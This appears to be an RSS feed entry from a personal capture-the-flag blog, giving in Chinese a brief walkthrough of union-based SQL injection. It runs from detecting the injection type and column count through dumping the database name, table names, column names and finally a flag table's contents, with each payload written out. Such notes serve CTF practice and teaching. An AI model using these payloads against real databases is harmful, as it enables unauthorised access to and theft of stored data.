channel.title: Ctfs on BLOG OF RTY
channel.description: Recent content in Ctfs on BLOG OF RTY

item.title: Sql注入
item.description: 整数型注入与字符型注入 探测列数 order by 1,2,3 使用union select判断注入点 -1 union select 1,2 判断出回显位置后爆库 -1 union select 1,database() 拿到库名后开始爆表 -1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 拿到表名后开始爆字段 -1’ union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘flag’# 拿到字段后，开始爆字段内容 -1’ union select 1,(select flag from flag)#
